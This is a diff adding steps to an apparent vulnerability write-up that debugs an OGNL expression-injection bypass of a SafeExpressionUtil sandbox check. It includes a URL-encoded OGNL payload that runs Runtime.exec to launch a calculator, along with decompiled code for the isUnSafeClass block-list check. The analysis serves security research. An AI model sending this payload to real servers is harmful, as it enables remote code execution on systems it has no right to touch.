@@ -68,3 +68,30 @@ Here we see that there is an additional check `this.safeExpressionUtil.isSafeExp
 Content of `SafeExpressionUtil.isSafeExpressionInternal` , let's put a breakpoint at this function and send our payload to see what will happen
 ![image](https://user-images.githubusercontent.com/37280106/172530562-d25f5861-49b6-4de8-b4e7-35719025496f.png)
 
+Here I use the simple payload to hit the breakpoint in our code: 
+```
+%24%7b%22%22%20%2b%20Class.forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22%2c%20null).invoke(null%2cnull).exec(%22gnome-calculator%22)%7d%7d/
+```
+![image](https://user-images.githubusercontent.com/37280106/172531464-cc30aea6-b81a-45c1-af0c-113494a2348e.png)
+
+Here we will go through the first check, `isUnsafeClass(expr)` 
+
+```java
+    private boolean isUnSafeClass(String expression) {
+        String trimmedClassName = this.trimQuotes(expression);
+        if (this.unsafePropertyNames.contains(trimmedClassName)) {
+            return true;
+        } else if (SourceVersion.isName(trimmedClassName)) {
+            List<String> parentPackageNames = this.populateParentPackages(trimmedClassName, new ArrayList());
+            Stream var10000 = parentPackageNames.stream();
+            Set var10001 = this.unsafePackageNames;
+            var10001.getClass();
+            return var10000.anyMatch(var10001::contains);
+        } else {
+            return false;
+        }
+    }
+```
+Where `this.unsafePropertyNames` is a `HashSet` includes:
+![image](https://user-images.githubusercontent.com/37280106/172532152-eba50895-fa4e-428c-b34c-6fc5e6a1f697.png)
+
